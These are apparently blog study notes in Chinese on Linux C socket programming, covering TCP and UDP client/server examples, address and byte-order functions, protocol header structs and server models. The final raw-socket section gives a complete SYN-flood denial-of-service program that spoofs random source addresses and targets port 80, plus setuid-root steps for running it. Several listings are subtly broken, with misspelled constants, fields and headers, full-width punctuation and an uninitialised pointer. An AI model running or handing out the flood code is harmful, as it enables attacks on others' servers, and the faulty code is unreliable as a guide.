---
date: 2016-07-24 07:40
status: public
title: Linux_C-网络编程
---

# 1. 初等网络函数介绍（TCP）
socket,bind,listen,accept,connect.

## 实例
```
//服务器端程序server.c 
#include<stdlib.h>
#include<stdio.h>
#include<errno.h>
#include<netdb.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<sys/socket.h>

int main(int argc, char** argv)
{
	int sockfd,new_fd;
	struct sockaddr_in server_addr;
	struct sockaddr_in client_addr;
	int sin_size,portnumber;
	char hello[]="Hello!Are You Fine?\n";
	if(argc!=2)
	{
		fprintf(stderr,"Usage: %s portnumber\a\n",argv[0]);
		exit(1);
	}
	if((portnumber=atoi(argv[1]))<0)
	{
		fprintf(stderr,"Usage: %s portnumber\a\n",argv[0]);
		exit(1);
	}
	//服务器端开始建立socket描述符
	if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)
	{
		fprintf(stderr,"Socket error: %s\n\a",strerror(errno));
		exit(1);
	}
	//服务器端填充sockaddr结构
	bzero(&server_addr,sizeof(struct sockaddr_in));
	server_addr.sin_family=AF_INET;
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons(portnumber);
	
	//捆绑sockfd描述符
	if(bind(sockfd,(struct sockaddr*)(&server_addr),sizeof(struct sockaddr))==-1)
	{
		fprintf(stderr,"Bind error: %s\n\a",strerror(errno));
		exit(1);
	}
	//监听sockfd描述符
	if(listen(sockfd,5)==-1)
	{
		fprintf(stderr,"Listen error: %s\n\a",strerror(errno);
		exit(1);
	}
	while(1)
	{
		//服务器阻塞，直到客户程序建立连接
		sin_size = sizeof(struct sockaddr_in);
		if((new_fd=accept(sockfd,(struct sockaddr*)(&client_addr),&sin_size))==-1)
		{
			fprintf(stderr,"Accept error: %s\n\a",strerror(errno));
			exit(1);
		}
		fprintf(stderr,"Server get connection from %s\n",inet_ntoa(client_addr.sin_addr));
		if(write(new_fd,hello,strlen(hello))==-1)
		{
			fprintf(stderr,"Write Error: %s\n",strerror(errno))；
			exit(1);
		}
		close(new_fd);
		
	}
	close(sockfd);
	exit(0);
}
```

```c:n
//客户端程序client.c
#include<stdlib.h>
#include<stdio.h>
#include<errno.h>
#include<string.h>
#include<netdb.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<sys/socket.h>

int main(int argc,char** argv)
{
	int sockfd;
	char buffer[1024];
	struct sockaddr_in server_addr;
	struct hostent *host;
	int portnumber,nbytes;
	if(argc!=3)
	{
		fprintf(stderr,"Usage: %s hostname portnumber\a\n",argv[0]);
		exit(1);
	}
	if((host=gethostbyname(argv[1]))==NULL)
	{
		fprintf(stderr,"Gethostname error\n");
		exit(1);
	}
	if((portnumber=atoi(argv[2]))<0)
	{
		fprintf(stderr,"Usage: %s hostname portnumber\a\n",argv[0]);
		exit(1);
	}
	
	//客户程序开始建立，sockfd描述符
	if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)
	{
		fprintf(stderr,"Socket Error: %s\a\n",strerror(errno));
		exit(1);
	}
	
	//客户程序填充服务端的资料
	bzero(&server_addr,sizeof(server_addr));
	server_addr.sin_family=AF_INET;
	server_addr.sin_port=htons(portnumber);
	server_addr.sin_addr=*((struct in_addr*)host->h_addr);
	//客户程序发起连接请求
	if(connect(sockfd,(struct sockaddr*)(&server_addr),sizeof(struct sockaddr))==-1)
	{
		fprintf(stderr,"Connect Error: %s\a\n",strerror(errno));
		exit(1);
	}
	//连接成功了
	if((nbytes=read(sockfd,buffer,1024))==-1)
	{
		fprintf(stderr,"Read Error: %s\n",strerror(errno));
		exit(1);
	}
	buffer[nbytes]='\0';
	printf("I have received: %s\n",buffer);
	//结束通讯
	close(sockfd);
	exit(0);
}
```

使用makefile编译。
```
#############MakeFile###############
all: server client
server: server.c 
gcc $^ -o $@
client: client.c
gcc $^ -o $@
```
运行make后会产生两个程序：server,client。先运行`./server port number`&(portnumber取任意大于1024且不在/etc/services中出现)，然后运行`./client localhost 8888`。

# 3. 服务器和客户机的信息函数
## 3.1 字节转换函数
i386和alpha芯片的字节存放顺序不同，前者低字节在内存地址的低端，后者反之。
```c:n 
unsigned long int htonl(unsigned long int hostlong)
unsigned short int htons(unisgned short int hostshort)
unsigned long int ntohl(unsigned long int netlong)
unsigned short int ntohs(unsigned short int netshort)
```
这几个转换函数中，h代表host，n代表network，s代表short，l代表long。

## 3.2 IP和域名的转换
```c:n 
struct hostent *gethostbyname(const char *hostname)
struct hostent *gethostbyaddr(const char *addr,int len,int type)
在<netdb.h>;中有 struct hostent 的定义
struct hostent{
char *h_name; /* 主机的正式名称 */
char *h_aliases; /* 主机的别名 */
int h_addrtype; /* 主机的地址类型 AF_INET*/
int h_length; /* 主机的地址长度 对于 IP4 是 4 字节 32 位*/
char **h_addr_list; /* 主机的 IP 地址列表 */
}
```
## 3.3 字符串的IP和32位的IP转换
点分十进制<==>32位IP(Hex)
```c:n 
int inet_aton(const char *cp,struct in_addr *inp)
char *inet_ntoa(struct in_addr in)
```
a代表ascii（点分十进制），n代表network（32位IP）。

## 3.4 服务信息函数
```
int getsockname(int sockfd,struct sockaddr *localaddr,int *addrlen)
int getpeername(int sockfd,struct sockaddr *peeraddr, int *addrlen)
struct servent *getservbyname(const char *servname,const char *protoname)
struct servent *getservbyport(int port,const char *protoname)
struct servent
{
char *s_name; /* 正式服务名 */
char **s_aliases; /* 别名列表 */
int s_port; /* 端口号 */
char *s_proto; /*使用的协议*/
}
```

## 3.5 实例
```c:n 
#include<netdb.h>
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/in.h>

int main(int argc,char** argv)
{
	struct sockaddr_in addr;
	struct hostent *host;
	char** alias;
	if(argc<2)
	{
		fprintf(stderr,"Usage: %s hostname|ip.\n\a",argv[0]);
		exit(1);
	}
	argv++;
	for(;*argv!=NULL;argv++)
	{
		//假设argv参数是点分十进制的IP
		if(inet_aton(*argv,&addr.sin_addr)!=0)
		{
			host = gethostbyaddr((char*)&addr.sin_addr,4,AF_INET);
			printf("Address information of Ip %s\n",*argv);
		}
		else{
			host = gethostbyname(*argv);
			printf("Address information of host %s\n",*argv);
		}
		if(host==NULL)
		{
			fprintf(stderr,"No address information of %s\n",*argv);
			continue;
		}
		printf("Official host name %s\n",host->h_name);
		printf("Name aliases: ");
		for(alias=host->h_aliases;*alias!=NULL;alias++)
			printf("%s,",*alias);
		printf("\nIp address: ");
		for(alias=host->h_addr_list;*alias!=NULL;alias++)
			printf("%s,",inet_ntoa(*(struct in_addr*)(*alias)));
	}
}
```

# 4. 完整的读写函数
建立连接后即开始通信。
## 4.1 write
write 函数将 buf 中的 nbytes 字节内容写入文件描述符fd.成功时返回写的字节数.失败时返回-1. 并设置 errno 变量.
在网络程序中，向套接字文件描述符写时有两种可能：
* write的返回值大于0，表示写了部分或全部的数据。
* 返回值小于0，则出错，须根据错误类型来处理。
若错误是EINTR，即为写时中断错误；若为EPIPE，表示网络连接出现问题（对方关闭连接等）。

下面的函数用来处理这几种错误：
```c:n 
int my_write(int fd,void* buffer,int length)
{
	int bytes_left;
	int written_bytes;
	char* ptr;
	ptr = buffer;
	bytes_left = length;
	while(bytes_left>0)
	{
		//开始写
		written_bytes = write(fd,ptr,bytes_left);//这是想一次就写完啊~
		if(written_bytes<=0)//出错了
		{
			if(errno==EINTR)//中断错误，继续写
			written_bytes=0;
			else//其他错误，退出
			return -1;
		}
		bytes_left -= written_bytes;
		ptr += written_bytes;//从剩下的地方继续写
	}
	return 0;
}
```

## 4.2 read
ssize_t read(int fd,void *buf,size_t nbyte) read 函数是负责从 fd 中读取内容.当读成功时,read 返回实际所读的字节数,如果返回的值是 0 表示已经读到文件的结束了,小于0 表示出现了错误.如果错误为 EINTR 说明读是由中断引起的, 如果是 ECONNREST 表示网络连接出了问题。

```c:n 
int my_read(int fd,void *buffer,int length)
{
int bytes_left;
int bytes_read;
char *ptr;
bytes_left=length;
while(bytes_left>;0)
{
bytes_read=read(fd,ptr,bytes_read);
if(bytes_read<0)
{
if(errno==EINTR)
bytes_read=0;
else
return(-1);
}
else if(bytes_read==0)
break;
bytes_left-=bytes_read;
ptr+=bytes_read;
}
return(length-bytes_left);
}
```

## 4.3 数据的传递
```c:n 
//客户端向服务端写
struct my_struct my_struct_client;
write(fd,(void*)&my_struct_client,sizeof(struct my_struct);

//服务端的读
char buffer[sizeof(struct my_struct)];
struct *my_struct_server;
read(fd,(void*)buffer,sizeof(struct my_struct));
my_struct_server=(struct my_struct*)buffer;
```
在网路上传递指针是无意义的，必须传递指针所指向的内容(char).

# 5. 用户数据报发送
两个常用函数；
```c:n
int recvfrom(int sockfd,void *buf,int len,unsigned int flags,struct sockaddr * from,int *fromlen)
int sendto(int sockfd,const void *msg,int len,unsigned int flags,struct sockaddr *to,int tolen)
```

实例：
```c:n
/*服务端程序server.c*/
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdio.h>
#include<errno.h>

#define SERVER_PORT 8888 
#define MAX_MSG_SIZE 1024 

void udps_respon(int sockfd)
{
	struct sockaddr_in addr;
	int addrlen,n;
	char msg[MAX_MSG_SIZE];
	while(1)
	{
		//从网络读，写到网络上去
		n = recvfrom(sockfd,msg,MAX_MSG_SIZE,0,(struct sockaddr*)&addr,&addrlen);
		msg[n]=0;
		//显示服务端已经收到了信息
		fprintf(stdout,"I have received %s",msg);
		sendto(sockfd,msg,n,0,(struct sockaddr*)&addr,addrlen);
	}
}

int main(void)
{
	int sockfd;
	struct sockaddr_in addr;
	sockfd = socket(AF_INET,SOCK_DGRAM,0);
	if(sockfd<0)
	{
		fprintf(stderr,"Socket Error: %s\n",strerror(errno));
		exit(1);
	}
	bzero(&addr,sizeof(struct sockaddr_in));
	addr.sin_family=AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = htons(SERVER_PORT);
	if(bind(sockfd,(struct sockaddr*)&addr,sizeof(struct sockaddr_in))<0)
	{
		fprintf(stderr,"Bind Error: %s\n",strerror(errno));
		exit(1);
	}
	udps_respon(sockfd);
	close(sockfd);
}

//客户端程序client
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<errno.h>
#include<stdio.h>
#include<unisted.h>
#define MAX_BUF_SIZE 1024
void udpc_requ(int sockfd,const struct sockaddr_in *addr,int len)
{
	char buffer[MAX_BUF_SIZE];
	int n;
	while(1)
	{
		//从键盘读入，写到服务端
		fgets(buffer,MAX_BUF_SIZE,stdin);
		sendto(sockfd,buffer,strlen(buffer),0,addr,len);
		bzero(buffer,MAX_BUF_SIZE);
		//从网络上读，写到屏幕上
		n = recvfrom(sockfd,buffer,MAX_BUF_SIZE,0,NULL,NULL);
		buffer[n]=0;
		fputs(buffer,stdout);
	}
}

int main(int argc,char** argv)
{
	int sockfd,port;
	struct sockaddr_in addr;
	if(argc!=3)
	{
		fprintf(stderr,"Usage: %s server_ip server_port\n",argv[0]);
		exit(1);
	}
	if((port=atoi(argv[2]))<0)
	{
		fprintf(stderr,"Usage: %s server_ip server_port\n",argv[0]);
		exit(1);
	}
	sockfd=socket(AF_INET,SOCK_DGRAM,0);
	if(sockfd<0)
	{
		fprintf(stderr,"Socket Error: %s\n",strerror(errno));
		exit(1);
	}
	//填充服务器的资料
	bzero(&addr,sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	if(inet_aton(argv[1],&addr.sin_addr)<0)
	{
		fprintf(stderr,"Ip error: %s\n",strerror(errno));
		exit(1);
	}
	udpc_requ(sockfd,&addr,sizeof(struct sockaddr_in));
	close(sockfd);
}

#########Makefile#########
all: server client
server: server.c
gcc -o server server.c 
client: client.c 
gcc -o client client.c 
clean: 
rm -f server 
rm -f client 
rm -f core
```

>上面的实例如果大家编译运行的话,会发现一个小问题的. 在我机器上面,我先运行服务端,然后运行客户端.在客户端输入信息,发送到服务端, 在服务端显示已经收到信息,但是客户端没有反映.再运行一个客户端,向服务端发出信息 却可以得到反应.我想可能是第一个客户端已经阻塞了.如果谁知道怎么解决的话,请告诉我,谢谢. 由于UDP协议是不保证可靠接收数据的要求,所以我们在发送信息的时候,系统并不能够保证我们发出的信息都正确无误的到达目的地.一般的来说我们在编写网络程序的时候都是选用 TCP 协议的.

# 6. 高级套接字函数
## 6.1 recv & send 
比read和write多了一个flags参数。
## 6.2 recvfrom & sendto 
## 6.3 recvmsg & sendmsg
recvmsg 和 sendmsg 可以实现前面所有的读写函数的功能.
```c:n 

int recvmsg(int sockfd,struct msghdr *msg,int flags)
int sendmsg(int sockfd,struct msghdr *msg,int flags)
struct msghdr
{
void *msg_name;
int msg_namelen;
struct iovec *msg_iov;
int msg_iovlen;
void *msg_control;
int msg_controllen;
int msg_flags;
}
struct iovec
{
void *iov_base; /* 缓冲区开始的地址 */
size_t iov_len; /* 缓冲区的长度 */
}
```
## 套接字的关闭
close & shutdown
TCP连接是可读写双向的，close双向关闭，shutdown可以只关闭一个方向，
`int shutdown(int sockfd,int howto)`
* howto=0，关闭读通道，但是可以继续往接字描述符写
* howto=1，关闭写通道，此时只可以读
* howto=2，关闭读写通道。

>在多进程程序里面,如果有几个子进程共享一个套接字时,如果我们使用 shutdown, 那么所有的子进程都不能够操作了,这个时候我们只能够使用 close 来关闭子进程的套接字描述符.

# TCP/IP协议
 IP 的结构定义<netinet/ip.h>;
```c:n
struct ip
{
#if __BYTE_ORDER == __LITTLE_ENDIAN
unsigned int ip_hl：4; /* header length */
unsigned int ip_v：4; /* version */
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
unsigned int ip_v：4; /* version */
unsigned int ip_hl：4; /* header length */
#endif
u_int8_t ip_tos; /* type of service 说明提供的优先权*/
u_short ip_len; /* total length */
u_short ip_id; /* identification */
u_short ip_off; /* fragment offset field 碎片偏移，和id一起重组碎片*/
#define IP_RF 0x8000 /* reserved fragment flag */
#define IP_DF 0x4000 /* dont fragment flag */
#define IP_MF 0x2000 /* more fragments flag */
#define IP_OFFMASK 0x1fff /* mask for fragmenting bits */
u_int8_t ip_ttl; /* time to live */
u_int8_t ip_p; /* protocol */
u_short ip_sum; /* checksum 首部校验和*/
struct in_addr ip_src, ip_dst; /* source and dest address */
};
```

# ICMP
ICMP 在<netinet/ip_icmp.h>中的定义是
```c:n 
struct icmphdr
{
u_int8_t type; /* message type */
u_int8_t code; /* type sub-code */
u_int16_t checksum;
union
{
struct
{
u_int16_t id;
u_int16_t sequence;
} echo; /* echo datagram */
u_int32_t gateway; /* gateway address */
struct
{
u_int16_t __unused;
u_int16_t mtu;
} frag; /* path mtu discovery */
} un;
};
```

# UDP
UDP 结构在<netinet/udp.h>中的定义为：
```c:n 
struct udphdr {
u_int16_t source;
u_int16_t dest;
u_int16_t len;
u_int16_t check;
};
```

# TCP 
TCP 的结构在<netinet/tcp.h>中定义为：
```c:n 
struct tcphdr
{
u_int16_t source;
u_int16_t dest;
u_int32_t seq;
u_int32_t ack_seq;
#if __BYTE_ORDER == __LITTLE_ENDIAN
u_int16_t res1：4;
u_int16_t doff：4;
u_int16_t fin：1;
u_int16_t syn：1;
u_int16_t rst：1;
u_int16_t psh：1;
u_int16_t ack：1;
u_int16_t urg：1;
u_int16_t res2：2;
#elif __BYTE_ORDER == __BIG_ENDIAN
u_int16_t doff：4;
u_int16_t res1：4;
u_int16_t res2：2;
u_int16_t urg：1;
u_int16_t ack：1;
u_int16_t psh：1;
u_int16_t rst：1;
u_int16_t syn：1;
u_int16_t fin：1;
#endif
u_int16_t window;
u_int16_t check;
u_int16_t urg_prt;
};
```
|identification|function|
|---|---|
|source|发送TCP数据的源端口|
|dest|接受TCP数据的目的端口|
|seq|标识该TCP所包含的数据字节的**开始序列号**|
|ack_seq|确认序列号，表示接受方下一次接受的数据序列号|
|doff|数据首部长度，和IP协议一样，以4字节为单位，一般为5|
|urg|如果设置紧急数据指针，则该位为1|
|ack|若确认号正确，为1|
|psh|若设置为1，则接收方收到数据后，立即交给上一层程序|
|rst|为1时表示请求重新连接|
|syn|为1时表示请求建立连接|
|fin|为1表示请求关闭连接|
|window|窗口，告诉接收者可以接收的大小|
|check|对TCP数据进行校核|
|urg_ptr|若urg=1，则指出紧急数据对于历史数据开始的序列号的偏移值|

## TCP连接的建立
三次握手。

# 套接字选项
## getsockopt & setsockopt
参数level 指定控制套接字的层次.可以取三种值：
 1)SOL_SOCKET：通用套接字选项. 
 2)IPPROTO_IP：IP 选项. 
 3)IPPROTO_TCP：TCP 选项.

参数optval获得或设置套接字选项（操作）

## ioctl
`int itctl(int fd,int req,...)`
可以控制所有的文件描述符的情况。
详细选项可用`man ioctl_list`查看。

# 服务器模型
## 循环服务器： UDP服务器
UDP服务器每次从套接字上读取一个客户端的请求，然后将结果返回给客户机。没有一个客户端可以老是占住服务端，对于每一个客户机的请求总是能够满足。
```c:n 
socket(...);
bind(...);
while(1)
{
	recvfrom(...);
	process(...);
	sendto(...);
}
```
## 循环服务器：TCP服务器
TCP服务器接收一个客户端的连接，然后处理，完成该客户的所有请求后，断开连接。一次只能处理一个客户端，故一般很少用作循环服务器模型。
```c:n 
socket(...);
bind(...);
listen(...);
while(1)
{
	accept(...);
	while(1)
	{
		read(...);
		process(...);
		write(...);
	}
	close(...);
}
```

## 并发服务器：TCP服务器
并发服务器的思想是每一个客户机的请求并不由服务器直接处理，而是服务器创建一个子进程来处理。有一个副作用：创建子进程非常消耗资源。
```c:n 
socket(...);
bind(...);
listen(...);
while(1)
{
	accept(...);
	if(fork(...)==0)
	{
		while(1)
		{
			read(...);
			process(...);
			write(...);
		}
		close(...);
		exit(...);
	}
	close(...);
}
```
## 并发服务器：多路复用I/O
解决创建子进程带来的系统资源消耗问题。该模型实际上将UDP循环模型用在了TCP上面。带来一个问题是可能导致有些客户等待很久。
select函数的一个例子：
```
int use_select(int* readfd,int n)
{
	fd_set my_readfd;
	int maxfd;
	int i;
	maxfd = readfd[0];
	for(i=1;i<n;i++)
		if(readfd>maxfd)maxfd=readfd;
	while(1)
	{
		//将所有的文件描述符加入
		FD_ZERO(&my_readfd);
		for(i=0;i<n;i++)
			FD_SET(readfd,*my_readfd);
		//进程阻塞
		select(maxfd+1,&my_readfd,NULL,NULL,NULL);
		//可以开始读了
		for(i=0;i<n;i++)
		{
			if(FD_ISSET(readfd,&my_readfd))
			{
				we_read(readfd);
			}
		}
	}
}
//然后服务器程序就变成如下：
初始化(socket,bind,listen);
while(1)
{
	设置监听读写文件描述符(FD_*);
	调用select;
	if倾听套接字就绪，说明新连接请求建立
	{
		建立连接(accept);
		加入到监听文件描述符中；
	}
	else 说明是一个已连接过的描述符
	{
		进行操作(read | write);
	}
}
```
## 并发服务器：UDP服务器
也是通过创建子进程来处理。很少用。

## 并发TCP服务器实例
```c:n 
#include <sys/socket.h>;
#include <sys/types.h>;
#include <netinet/in.h>;
#include <string.h>;
#include <errno.h>;
#define MY_PORT 8888
int main(int argc ,char **argv)
{
int listen_fd,accept_fd;
struct sockaddr_in client_addr;
int n;
if((listen_fd=socket(AF_INET,SOCK_STREAM,0))<0)
{
printf("Socket Error：%s\n\a",strerror(errno));
exit(1);
}
bzero(&client_addr,sizeof(struct sockaddr_in));
client_addr.sin_family=AF_INET;
client_addr.sin_port=htons(MY_PORT);
client_addr.sin_addr.s_addr=htonl(INADDR_ANY);
n=1;
/* 如果服务器终止后,服务器可以第二次快速启动而不用等待一段时间 */
setsockopt(listen_fd,SOL_SOCKET,SO_REUSEADDR,&n,sizeof(int));
if(bind(listen_fd,(struct sockaddr *)&client_addr,sizeof(client_addr))<0)
{
printf("Bind Error：%s\n\a",strerror(errno));
exit(1);
}
listen(listen_fd,5);
while(1)
{
accept_fd=accept(listen_fd,NULL,NULL);
if((accept_fd<0)&&(errno==EINTR))
continue;
else if(accept_fd<0)
{
printf("Accept Error：%s\n\a",strerror(errno));
continue;
}
if((n=fork())==0)
{
/* 子进程处理客户端的连接 */
char buffer[1024];
close(listen_fd);
n=read(accept_fd,buffer,1024);
write(accept_fd,buffer,n);
close(accept_fd);
exit(0);
}
else if(n<0)
printf("Fork Error：%s\n\a",strerror(errno));
close(accept_fd);
}
}
```

# 原始套接字
前面接触到SOCK_STREAM和SOCK_DRAGM两种套接字。原始套接字SOCK_RAW可以实现TCP和UDP套接字不能实现的功能，且只能由有root权限的用户创建。
## 原始套接字的创建
实现DOS的小程序：
```c:n 
/*******************DOS.c************/
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include<stdlib.h>
#include<errno.h>
#include<unisted.h>
#include<stdio.h>
#include<netdb.h>
#define DESTPORT 80	/*要攻击的端口*/
#define LOCALPORT 8888

void send_tcp(int sockfd,struct sockaddr_in *addr);
unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char** argv)
{
	int sockfd;
	struct sockaddr_in addr;
	struct hostent *host;
	int on=1;
	if(argc!=2)
	{
		fprintf(stderr,"Usage: %s hostname\n\a",argv[0]);
		exit(1);
	}
	bzero(&addr,sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(DESTPORT);
	if(inet_aton(argv[1],&addr.sin_addr)==0)
	{
		host = gethostbyname(argv[1]);
		if(host==NULL)
		{
			fprintf(stderr,"HostName Error: %s\n\a",hstrerror(h_errno));
			exit(1);
		}
		addr.sin_addr=*(struct in_addr*)(host->h_addr_list[0]);
	}
	//使用IPPROTO_TCP创建一个TCP的原始套接字
	sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
	if(sockfd<0)
	{
		fprintf(stderr,"Socket Error: %s\n\a",strerror(errno));
		exit(1);
	}
	
	//设置IP数据包格式（自创TCPUDP哈哈）
	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCI,&on,sizeof(on));
	//超级用户
	setuid(getpid());
	//发送炸弹
	send_tcp(sockfd,&addr);
}

/*发送炸弹的实现*/
void send_tcp(int sockfd,struct sockaddr_in *addr)
{
	char buffer[100];	//放置数据包
	struct ip *ip;
	struct tcphdr *tcp;
	int head_len;
	//数据包实际没有任何内容，就是两个结构的长度~
	head_len = sizeof(struct ip)+sizeof(struct tcphdr);
	bzero(buffer,100);
	//填充IP数据包的头部
	ip = (struct ip*)buffer;
	ip->ip_v = IPVERSION;//一般就是IPv4
	ip->ip_hl = sizeof(strucp ip)>>2;//IP数据包的头部长度
	ip->ip_tos = 0;//服务类型
	ip->ip_len = htons(head_len);//IP数据包的长度(因为只有头。。。)
	ip->ip_id = 0;//让系统填写~
	ip->ip_off = 0;//同上
	ip->ip_ttl = MAXTTL;//最长的时间255
	ip->ip_p = IPPROTO_TCP;//发送TCP包
	ip->ip_sum = 0;//校验让系统去做
	ip->ip_dst = addr->sin_addr;//程序要攻击的对象
	
	//开始填写TCP数据包
	tcp = (struct tcphdr*)(buffer+sizeof(struct ip));
	tcp->source = htons(LOCALPORT);
	tcp->dest = addr->sin_port;//目的端口
	tcp->seq = random();
	tcp->ack_seq=0;
	tcp->doff=5;
	tcp->sys=1;//请求建立连接
	tcp->check=0;
	
	//开始啦
	while(1)
	{
		ip->ip_src.s_addr=random();
		
		//手动校验头部
		tcp->check = check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
		sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in));
	}
}

//首部校验和的算法
unsigned short check_sum(unsigned short *addr,int len)
{
	register int nleft = len;
	register int sum = 0;
	register short *w = addr;
	short answer = 0;
	while(nleft>1)
	{
		sum += *w++;
		nleft -= 2;
	}
	if(nleft==1)
	{
		*(unsigned char*)(&answer)=*(unsigned char*)w;
		sum += answer;
	}
	sum = (sum>>16)+(sum&0xffff);
	sum+=(sum>>16);
	answer = ~sum;
	return answer;
}
//将该程序的所有者变为root，设置setuid位：
//chown root DOS
//chmod +s DOS
```
# 相关笔记目录
## [基础知识-gcc\makefile](http://danceiny.farbox.com/post/c/linuxcao-zuo-xi-tong-xia-cyu-yan-bian-cheng-ru-men)
## [时间概念-时间测量](http://danceiny.farbox.com/post/c/linux_c-shi-jian-gai-nian)
## [消息管理-signal](http://danceiny.farbox.com/post/c/linux_c-xiao-xi-guan-li)
## [网络编程-Socket\IP\TCP\UDP](http://danceiny.farbox.com/post/c/linux_c-wang-luo-bian-cheng)
## [线程操作-文件夹备份](http://danceiny.farbox.com/post/c/linux_c-xian-cheng-cao-zuo)
## [开发工具-gcc/gdb](http://danceiny.farbox.com/post/c/linuxxia-ckai-fa-gong-ju)